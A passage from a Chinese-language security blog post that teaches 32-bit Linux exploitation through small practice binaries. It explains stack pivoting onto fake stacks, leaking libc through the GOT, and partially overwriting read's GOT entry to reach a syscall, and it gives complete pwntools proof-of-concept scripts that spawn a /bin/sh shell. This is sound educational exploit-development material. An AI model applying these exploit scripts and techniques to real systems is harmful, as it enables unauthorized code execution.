+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:0804843B                 public fun</span><br><span class="line">.text:0804843B fun             proc near               ; CODE XREF: main+11p</span><br><span class="line">.text:0804843B</span><br><span class="line">.text:0804843B buf             = byte ptr -28h</span><br><span class="line">.text:0804843B</span><br><span class="line">.text:0804843B                 push    ebp</span><br><span class="line">.text:0804843C                 mov     ebp, esp</span><br><span class="line">.text:0804843E                 sub     esp, 28h</span><br><span class="line">.text:08048441                 sub     esp, 4</span><br><span class="line">.text:08048444                 push    30h             ; nbytes</span><br><span class="line">.text:08048446                 lea     eax, [ebp+buf]</span><br><span class="line">.text:08048449                 push    eax             ; buf</span><br><span class="line">.text:0804844A                 push    0               ; fd</span><br><span class="line">.text:0804844C                 call    _read</span><br><span class="line">.text:08048451                 add     esp, 10h</span><br><span class="line">.text:08048454                 sub     esp, 4</span><br><span class="line">.text:08048457                 push    30h             ; n</span><br><span class="line">.text:08048459                 lea     eax, [ebp+buf]</span><br><span class="line">.text:0804845C                 push    eax             ; buf</span><br><span class="line">.text:0804845D                 push    1               ; fd</span><br><span class="line">.text:0804845F                 call    _write</span><br><span class="line">.text:08048464                 add     esp, 10h</span><br><span class="line">.text:08048467                 nop</span><br><span class="line">.text:08048468                 leave</span><br><span class="line">.text:08048469                 retn</span><br><span class="line">.text:08048469 fun             endp</span><br></pre></td></tr></table></figure>
+<p>由于要不断调用read且不能使用rop，所以后面我们一直把ret改成main。</p>
+<p>这里我们伪造两个栈区，dataA(fake stack) = 0x0804A000 + 0x200 , dataB(fake stack) = 0x0804A000 + 0x400</p>
+<p>一开始，我们的栈是这样的：</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_f52af45f237fb13bbc9ff6ae98e456be.png" alt=""></p>
+<p>然后我们通过栈溢出把ebp改成了dataA,ret改到main，再次输入的时候，我们把之前的‘a’*0x28的padding改成我们打算执行的ROP代码。<br>（后面的leave是 mov esp,ebp ; pop ebp）</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_c454ca10d50fe6de5479708f076c3086.png" alt=""></p>
+<p>下面的ebp我们填成dataB,ret以后变成这样：<br>（后面的leave是 mov esp,ebp ; pop ebp）</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_043af3e9c72f9e020e63f4ebb0e9543f.png" alt=""></p>
+<p>由于代码中push和pop操作，且esp在dataA区域，所以ROP（part1）后面的部分代码会被破坏（x64没有这种情况），在dataB中填入’A’*0x28的padding，ebp改到dataA的后面准备继续修补ROP。</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_bc511cc3a4f1cc0f6271fe84ae7edc3a.png" alt=""></p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_c6cd16719f98f4584d3a1da0cde4a015.png" alt=""></p>
+<p>经过gdb调试，一个part的大小为0xC，通过分段多次写入，最后在dataA就保存了我们需要的ROP。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#overflow_length = 0x28</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">	pay = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(addr + <span class="number">0x28</span>) + p32(code_read)</span><br><span class="line">	cn.send(pay)</span><br><span class="line">	cn.recv()</span><br><span class="line">	pay = data.ljust(<span class="number">0x28</span>,<span class="string">'\xff'</span>) + p32(<span class="number">0x0804A000</span> + <span class="number">0x400</span>) + p32(code_read)</span><br><span class="line">	cn.send(pay)</span><br><span class="line">	cn.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeall</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">	n = len(data)//<span class="number">0xc</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">		write(addr +i*<span class="number">0xc</span>,data[i*<span class="number">0xc</span>:(i+<span class="number">1</span>)*<span class="number">0xc</span>])</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">	write(addr+i*<span class="number">0xc</span>,data[i*<span class="number">0xc</span>:])</span><br></pre></td></tr></table></figure>
+<p>接着只要把ret改到dataA的rop前的4字节，然后把ret改到leave；ret就可以调用我们的ROP了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leave_ret = <span class="number">0x08048468</span></span><br><span class="line"></span><br><span class="line">cn.send(<span class="string">'a'</span>*<span class="number">0x28</span> + p32(<span class="number">0x0804A000</span> + <span class="number">0x200</span> <span class="number">-4</span>) + p32(leave_ret))</span><br></pre></td></tr></table></figure>
+<p>下面是完整的poc，可以用gdb调试调试有助于理解。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#overflow_length = 0x28</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">	pay = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(addr + <span class="number">0x28</span>) + p32(code_read)</span><br><span class="line">	cn.send(pay)</span><br><span class="line">	cn.recv()</span><br><span class="line">	pay = data.ljust(<span class="number">0x28</span>,<span class="string">'\xff'</span>) + p32(<span class="number">0x0804A000</span> + <span class="number">0x400</span>) + p32(code_read)</span><br><span class="line">	cn.send(pay)</span><br><span class="line">	cn.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeall</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">	n = len(data)//<span class="number">0xc</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">		write(addr +i*<span class="number">0xc</span>,data[i*<span class="number">0xc</span>:(i+<span class="number">1</span>)*<span class="number">0xc</span>])</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">	write(addr+i*<span class="number">0xc</span>,data[i*<span class="number">0xc</span>:])</span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./pwn3_2'</span>)</span><br><span class="line">bin = ELF(<span class="string">'./pwn3_2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p3ret = <span class="number">0x080484e9</span></span><br><span class="line">code_read = <span class="number">0x08048444</span></span><br><span class="line">leave_ret = <span class="number">0x08048468</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">''</span></span><br><span class="line">pay += p32(bin.symbols[<span class="string">'write'</span>]) + p32(p3ret) + p32(<span class="number">1</span>) + p32(bin.got[<span class="string">'read'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">pay += p32(bin.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">writeall(<span class="number">0x0804A000</span> + <span class="number">0x200</span>,pay)</span><br><span class="line"></span><br><span class="line">cn.send(<span class="string">'a'</span>*<span class="number">0x28</span> + p32(<span class="number">0x0804A000</span> + <span class="number">0x200</span> <span class="number">-4</span>) + p32(leave_ret))</span><br><span class="line">cn.recv(<span class="number">0x30</span>)</span><br><span class="line">p_read = u32(cn.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p_system = p_read - libc.symbols[<span class="string">'read'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">p_binsh = p_read - libc.symbols[<span class="string">'read'</span>] + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="keyword">print</span> hex(p_system),hex(p_binsh)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">''</span></span><br><span class="line">pay += p32(p_system) + <span class="string">'bbbb'</span> + p32(p_binsh)</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x0804A000</span> + <span class="number">0x300</span>,pay)</span><br><span class="line">cn.send(<span class="string">'a'</span>*<span class="number">0x28</span> + p32(<span class="number">0x0804A000</span> + <span class="number">0x300</span> <span class="number">-4</span>) + p32(leave_ret))</span><br><span class="line">cn.recv()</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h1><p>程序代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buffer,<span class="number">0x100</span>);</span><br><span class="line">    atoi(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc pwn4.c -m32 -fno-stack-protector -o pwn4</span><br></pre></td></tr></table></figure>
+<p>checksec:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>这道题和之前有一个很大的不同，那就是没有了write，还给了一个“没有用”的atoi。</p>
+<p>一般来说到这里思路就断了，因为没有输出函数代表没法leak，然而，这道题并不需要leak就能调用execve，那你大概能猜到，我们肯定是用syscall调用的execve。但是，程序里也没有syscall，libc的基址也没有leak，上哪找syscall呢？</p>
+<p><strong>重点</strong>：在libc.so中，read的后面不远处有一个syscall，相对距离小于0x100，由于libc开了pie而pie不随机最低一字节的特点，我们把read的got改成syscall。</p>
+<p>来看一下libc.so的反汇编代码</p>
+<p><strong>x86:</strong></p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_5988e4083ce15b6df2fdd8c6d5294a02.png" alt=""></p>
+<p>对，下面那个call奇怪地址的代码就是syscall，之所以长这样是因为在x86上，调用一个int0x80的代价是很大，有些syscall的调用是很频繁的（如获取时间的sys_time），如果都用int0x80来做会使系统的运行速度大大减慢，因此产生了vdso，加快调用的速度（具体怎么加速的我目前也不知道），总之上面那个<code>call    large dword ptr gs:10h</code>就是int0x80的作用。</p>
+<p><strong>x64:</strong></p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_41120c19934ea1128f40319391c7c7fc.png" alt=""></p>
+<p>下面两个都是syscall，当然具体情况要看自己的libc。</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>eax</th>
+<th>ebx</th>
+<th>ecx</th>
+<th>edx</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sys_execve</td>
+<td>0x0b</td>
+<td>char __user *</td>
+<td>char __user __user</td>
+<td>char __user __user</td>
+</tr>
+</tbody>
+</table>
+<p>所以大致思路是先将<code>/bin/sh</code>填入bss段，然后通过gadgets设置ebx指向bss段的<code>/bin/sh</code>，ecx设置为0；通过atoi的返回值把eax设置成0xb；edx没有gadgets，且最后调用syscall的时候edx正好为0。</p>
+<p>(ps.后面两个参数要为0或指向0的指针)</p>
+<p>也就是最后调用了execve(“/bin/sh”,0,0)。</p>
+<p>poc：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./pwn4_2'</span>)</span><br><span class="line">bin = ELF(<span class="string">'./pwn4_2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	<span class="comment">#return raw_input()</span></span><br><span class="line"></span><br><span class="line">p1ret = <span class="number">0x080482e9</span></span><br><span class="line">p3ret = <span class="number">0x080484e9</span></span><br><span class="line">p_ebx_ret = p1ret</span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x28</span> + <span class="string">'bbbb'</span> </span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>]) + p32(p3ret) + p32(<span class="number">0</span>) + p32(bin.bss()) + p32(<span class="number">0x10</span>)</span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>]) + p32(p3ret) + p32(<span class="number">0</span>) + p32(bin.got[<span class="string">'read'</span>]) + p32(<span class="number">1</span>)</span><br><span class="line">pay += p32(bin.plt[<span class="string">'atoi'</span>]) + p32(p1ret) + p32(bin.bss() + <span class="number">8</span>)</span><br><span class="line">pay += p32(p_ebx_ret) + p32(bin.bss())</span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">z()</span><br><span class="line">cn.send(pay)</span><br><span class="line">z()</span><br><span class="line">cn.send(<span class="string">'/bin/sh\x0011'</span>)</span><br><span class="line">z()</span><br><span class="line">cn.send(<span class="string">'\xdc'</span>)</span><br><span class="line">z()</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>程序代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buffer,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc pwn5.c -m32 -fno-stack-protector -o pwn5</span><br></pre></td></tr></table></figure>
+<p>checksec:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>大体和pwn4一样，就是没有了atoi设置eax，但是我们可以通过read的入读字节数设置eax。这里有一个问题，我们要把got表的read改成syscall，但是又要使eax设置成0xB来调用syscall，这两者必须同时发生，所以我们在read之前多读一些’\0‘字节，总共读入11字节，且覆盖read的最低一字节，使read改到syscall。</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_accf0df1b7a0dfef64d8af65c8add828.png" alt=""></p>
+<p>此外，根据gdb调试，这次没有上次那么幸运，edx在调用syscall的时候并不是0，所以调用是失败的，但根据人脑查找，这个程序有这样一处代码可以当gadget用。</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_1b5247ed4d475e444e4510d403db9e90.png" alt=""></p>
+<p>最后依然是通过syscall执行execve(“/bin/sh”,0,0)。</p>
+<p>poc：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./pwn5_2'</span>)</span><br><span class="line"></span><br><span class="line">bin = ELF(<span class="string">'./pwn5_2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> raw_input()</span><br><span class="line"></span><br><span class="line">p1ret = <span class="number">0x080482c9</span></span><br><span class="line">p3ret = <span class="number">0x080484a9</span></span><br><span class="line">p_ebx_ret = p1ret</span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x28</span> + <span class="string">'bbbb'</span> </span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>]) + p32(p3ret) + p32(<span class="number">0</span>) + p32(bin.bss()) + p32(<span class="number">0x20</span>)</span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>]) + p32(p3ret) + p32(<span class="number">0</span>) + p32(bin.got[<span class="string">'read'</span>]<span class="number">-0xa</span>) + p32(<span class="number">0xb</span>)</span><br><span class="line">pay += p32(p_ebx_ret) + p32(bin.bss())</span><br><span class="line">pay += p32(<span class="number">0x08048398</span>)<span class="comment">#set edx to zero</span></span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">z()</span><br><span class="line">cn.send(pay)</span><br><span class="line">z()</span><br><span class="line">cn.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">z()</span><br><span class="line">cn.send(<span class="string">'\x00'</span>*<span class="number">0xa</span>+<span class="string">'\xdc'</span>)</span><br><span class="line">z()</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Veritas501</li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://veritas501.github.io/2017/04/23/32位下花样read_write/" title="32位下花样read_write">https://veritas501.github.io/2017/04/23/32位下花样read_write/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/04/23/Linux Syscall Reference x64/" rel="next" title="Linux Syscall Reference x64">
+                <i class="fa fa-chevron-left"></i> Linux Syscall Reference x64
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/04/28/格式化字符串漏洞学习/" rel="prev" title="格式化字符串漏洞学习">
+                格式化字符串漏洞学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/215.png"
+                alt="Veritas501" />
+            
+              <p class="site-author-name" itemprop="name">Veritas501</p>
+              <p class="site-description motion-element" itemprop="description">开始踏上Re&Pwn之路...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">62</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">37</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/veritas501" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="http://music.163.com/#/user/home?id=58295006" target="_blank" title="网易云"><i class="fa fa-fw fa-music"></i>网易云</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/xu-qt/activities" target="_blank" title="知乎"><i class="fa fa-fw fa-quora"></i>知乎</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://osu.ppy.sh/users/9533614" target="_blank" title="OSU"><i class="fa fa-fw fa-headphones"></i>OSU</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn1"><span class="nav-number">1.</span> <span class="nav-text">pwn1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn2"><span class="nav-number">2.</span> <span class="nav-text">pwn2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn3"><span class="nav-number">3.</span> <span class="nav-text">pwn3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn4"><span class="nav-number">4.</span> <span class="nav-text">pwn4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn5"><span class="nav-number">5.</span> <span class="nav-text">pwn5</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Veritas501</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
